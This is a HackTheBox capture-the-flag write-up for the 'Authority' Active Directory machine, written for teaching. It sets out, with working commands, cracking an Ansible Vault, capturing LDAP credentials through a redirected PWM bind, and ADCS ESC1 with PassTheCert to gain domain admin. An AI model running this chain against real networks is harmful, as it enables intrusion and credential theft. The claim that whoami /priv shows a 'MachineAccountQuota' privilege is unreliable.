---
title: "HTB - Authority (Medium | Windows | Active Directory)"
date: 2026-09-17 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, pwm, smbclient, ansible-vault, ansible2john, evil-winrm, winrm, adcs, certipy, esc1, machineaccountquota, addcomputer, pass-the-cert, ldap]
description: "Crack an Ansible Vault for creds, capture LDAP creds via PWM, then ADCS ESC1 & PassTheCert to Domain Admin"
image:
  path: /assets/img/authority.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target>
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 14:59:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2026-09-17T15:00:28+00:00; +4h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2026-09-15T14:55:51
|_Not valid after:  2028-09-17T02:34:15
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
60292/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-17T15:00:20
|_  start_date: N/A
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
```

### Service Discovery Analysis

The Nmap scan reveals multiple critical services running on the target machine:

- **DNS (Port 53):** Simple DNS Plus
- **HTTP (Port 80):** Microsoft IIS 10.0 serving default page
- **Kerberos (Port 88):** Microsoft Windows Kerberos — confirms Active Directory environment
- **SMB (Port 139, 445):** Microsoft Windows file sharing with message signing required
- **LDAP (Port 389, 636, 3268, 3269):** Active Directory LDAP services — SSL cert expired (2022-2024), which may indicate outdated configurations
- **WinRM (Port 5985, 47001):** Windows Remote Management services
- **Apache Tomcat (Port 8443):** SSL-enabled web application — immediately stands out as a non-standard service in an AD environment
- **RPC Services:** Multiple endpoints across high ports

**Domain:** authority.htb / htb.corp **Hostname:** AUTHORITY

Two things immediately catch my attention: the **expired SSL certificate** on LDAP (suggesting this machine hasn't been maintained/patched) and **Apache Tomcat on port 8443**, which is unusual for a domain controller and likely hosts a web application worth investigating.

---

## **User**

### PWM Password Manager : 8443

**What is PWM?** PWM is an open-source password self-service application commonly used in enterprise environments alongside LDAP/Active Directory. It provides a web interface for users to reset their own passwords and manage LDAP-connected accounts.

**Why is it relevant here?** The PWM panel is running on port 8443. While we can see the login panel, we don't have credentials yet. However, PWM stores its LDAP connection configuration — including credentials — which means if we find those credentials, we may be able to interact with the panel and eventually capture LDAP credentials in cleartext.

![](/assets/img/authority/Pasted_image_20260917082754.png)

### SMB Enumeration

Since we have no credentials yet, we start by enumerating SMB shares anonymously. The `-N` flag disables password prompt and `-L` lists available shares:

```bash
smbclient -N -L //<target>/
```

![](/assets/img/authority/Pasted_image_20260917081224.png)

Several shares are visible. The **Development** share stands out as it is non-standard and likely contains sensitive configuration or deployment files.

Connect to the Development share anonymously:

```bash
smbclient -N //<target>/Development
```

![](/assets/img/authority/Pasted_image_20260917084210.png)

Inside the Development share we find files related to the PWM panel login — including Ansible configuration files. A `main.yml` file is discovered containing encrypted (hashed) passwords in Ansible Vault format.

![](/assets/img/authority/Pasted_image_20260917084344.png)

### Overview - Ansible Vault

**What is Ansible Vault?** Ansible Vault is a feature of Ansible (an IT automation tool) that allows users to encrypt sensitive data such as passwords, API keys, and secrets within Ansible playbooks and variable files. The encrypted data is stored in files ending in `.yml` and can only be decrypted with the correct vault password.

**Why is it dangerous here?** Ansible Vault files found in accessible SMB shares expose encrypted secrets that can be cracked offline if the vault password is weak.

### Cracking Ansible Vault Password

The `main.yml` file contains several Ansible Vault-encrypted secrets including `pwm_admin_password`, `pwm_admin_login`, and `ldap_admin_password`. We extract the vault hash and crack it offline.

`ansible2john` converts an Ansible Vault encrypted file into a hash format compatible with John the Ripper:

```bash
ansible2john vault_hash.txt > hash

john hash --wordlist=/usr/share/wordlists/rockyou.txt

!@#$%^&*         (vault_hash.txt)     
```

![](/assets/img/authority/Pasted_image_20260917084321.png)

**Ansible Vault Master Password:** `!@#$%^&*`

### Decrypting Ansible Vault Secrets

Now that we have the vault password, we use `ansible-vault decrypt` to decrypt each encrypted file. This command uses the vault password to reverse the AES-256 encryption applied by Ansible Vault:

```bash
ansible-vault decrypt ldap_admin_password.txt
ansible-vault decrypt pwm_admin_login.txt
ansible-vault decrypt pwm_admin_password.txt
```

![](/assets/img/authority/Pasted_image_20260917085310.png)

We now have the PWM admin credentials and the LDAP admin password in plaintext.

### PWM Panel Exploitation - LDAP Credential Capture

With the decrypted credentials, we log into the PWM administration panel on port 8443. The panel reveals an LDAP Directory configuration section.

![](/assets/img/authority/Pasted_image_20260917091401.png)

The key insight here is that PWM needs to test its LDAP connection. If we modify the LDAP server address to point to our machine and set it to use unencrypted LDAP (port 389, no SSL), PWM will send its configured LDAP bind credentials in cleartext to our listener when testing the connection.

We change the LDAP server address to our attacker IP and disable secure LDAP:

![](/assets/img/authority/Pasted_image_20260917091426.png)

We set up a Netcat listener on port 389 to capture the incoming LDAP bind request. Port 389 is the standard unencrypted LDAP port, which is why PWM will send credentials in cleartext:

```bash
sudo nc -lvnp 389
```

We click **Test LDAP Profile** in PWM to trigger the connection test:

![](/assets/img/authority/Pasted_image_20260917091554.png)

Our Netcat listener receives the LDAP bind request containing the credentials in cleartext:

![](/assets/img/authority/Pasted_image_20260917091618.png)

The captured credentials belong to the `svc_ldap` service account: `lDaP_1n_th3_cle4r!`

### WinRM Access as svc_ldap

Port 5985 (WinRM) was identified during recon. We attempt to connect using the captured LDAP service account credentials:

```bash
evil-winrm -i authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

![](/assets/img/authority/Pasted_image_20260917092019.png)

A WinRM session is established as `svc_ldap`. The user flag can now be retrieved.

---

## **Root**

### ADCS Certificate Template Enumeration

With svc_ldap access, we enumerate Active Directory Certificate Services (ADCS) to look for misconfigured certificate templates. The `-vulnerable` flag tells certipy to only show templates that are exploitable:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy find -target authority.htb -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -vulnerable -stdout
```

![](/assets/img/authority/Pasted_image_20260917092638.png)

### Overview - ESC1 (ADCS Misconfigured Certificate Templates)

**What is ESC1?** ESC1 is an Active Directory Certificate Services (ADCS) attack where a certificate template allows the enrollee to specify a Subject Alternative Name (SAN), combined with the Client Authentication extended key usage. This means an attacker can request a certificate that claims to belong to any user — including Administrator — and use it for authentication.

**Why is CorpVPN vulnerable?** The `CorpVPN` template has:

- `Enrollee Supplies Subject` enabled → attacker can specify any UPN
- Client Authentication extended key usage → can be used for domain authentication
- `AUTHORITY.HTB\Domain Computers` has enrollment rights → any machine account can enroll

**The attack path:** Since only domain computer accounts can enroll, we need to create a machine account first, then use that machine account to request a certificate claiming to be the Administrator.

![](/assets/img/authority/Pasted_image_20260917093112.png)

The `whoami /priv` output confirms that `svc_ldap` has the `MachineAccountQuota` privilege, meaning we can add computer accounts to the domain.

### ESC1 Exploitation

#### Step 1: Create a Machine Account

We use `impacket-addcomputer` to create a new computer account in the domain. Domain users can create machine accounts by default (up to 10), and machine accounts are part of `Domain Computers` group, which has enrollment rights on the vulnerable template:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
impacket-addcomputer -dc-ip <target> 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-name 'COMPUTER$' -computer-pass 'Be$tPa$$word@@@123'

[*] Successfully added machine account COMPUTER$ with password Be$tPa$$word@@@123.
```

#### Step 2: Request Malicious Certificate (ESC1 Attack)

Using the newly created machine account, we request a certificate from the vulnerable `CorpVPN` template. The `-upn` flag specifies the User Principal Name we want to impersonate — in this case, `Administrator@authority.htb`. The `-dns` flag sets the DNS SAN to match the domain:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy req -u 'COMPUTER$' -p 'Be$tPa$$word@@@123' -dc-ip <target> -dns authority.authority.htb -ca AUTHORITY-CA -template 'CorpVPN' -upn 'Administrator@authority.htb'

[*] Wrote certificate and private key to 'administrator_authority.pfx'
```

![](/assets/img/authority/Pasted_image_20260917094447.png)

A certificate claiming to be `Administrator@authority.htb` is successfully issued.

#### Step 3: Extract Certificate and Private Key

We split the PFX file into separate certificate and key files. The `-nokey` flag extracts only the certificate, and `-nocert` extracts only the private key:

```bash
certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
certipy cert -pfx administrator_authority.pfx -nocert -out user.key
```

![](/assets/img/authority/Pasted_image_20260917094821.png)

#### Step 4: Pass the Certificate for LDAP Shell

### Overview - PassTheCert

**What is PassTheCert?** PassTheCert is an attack technique that uses a client certificate to authenticate to LDAP over TLS (LDAPS). Unlike Kerberos or NTLM authentication, certificate-based authentication to LDAP allows performing privileged operations directly — such as modifying group memberships — without needing a password or hash. This is particularly powerful when Kerberos authentication fails due to clock skew or other issues.

We use `passthecert.py` to authenticate to LDAP using the Administrator certificate and obtain an LDAP shell. Through this shell we add `svc_ldap` to the `Administrators` group:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip <target>

add_user_to_group svc_ldap Administrators

Adding user: svc_ldap to group Administrators result: OK
```

![](/assets/img/authority/Pasted_image_20260917094957.png)

`svc_ldap` is now a member of the local Administrators group on the Domain Controller.

#### Step 5: Establish Administrator Shell

Reconnect via WinRM as `svc_ldap`. Since svc_ldap is now in the Administrators group, we have full administrative access:

```bash
evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

![](/assets/img/authority/Pasted_image_20260917095230.png)

Confirmation that svc_ldap is now a member of the Administrators group:

![](/assets/img/authority/Pasted_image_20260917095312.png)

Navigate to the Administrator's Desktop and retrieve the root flag.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified an unusual Apache Tomcat on port 8443 alongside standard AD services; expired SSL certs suggested an outdated environment
2. **SMB Enumeration:** Anonymously accessed the Development share and discovered Ansible configuration files containing Ansible Vault-encrypted secrets
3. **Ansible Vault Cracking:** Used ansible2john to extract the vault hash and cracked the master password with John the Ripper
4. **Secret Decryption:** Decrypted PWM admin credentials and LDAP admin password using the cracked vault password
5. **PWM Panel Access:** Logged into the PWM administration panel and modified the LDAP server configuration to point to the attacker's IP
6. **LDAP Credential Capture:** Set up a Netcat listener on port 389 and triggered PWM's LDAP connection test to capture svc_ldap credentials in cleartext
7. **WinRM Access:** Used captured svc_ldap credentials to establish an evil-winrm session
8. **ADCS Enumeration:** Identified ESC1 vulnerability in the CorpVPN template — enrollable by Domain Computers with Enrollee Supplies Subject enabled
9. **Machine Account Creation:** Created a domain computer account (COMPUTER$) using MachineAccountQuota privilege
10. **ESC1 Certificate Request:** Requested a certificate from CorpVPN template impersonating Administrator@authority.htb
11. **PassTheCert Attack:** Used the Administrator certificate to authenticate to LDAP and add svc_ldap to the Administrators group
12. **Full Compromise:** Reconnected via WinRM as svc_ldap with admin privileges and retrieved the root flag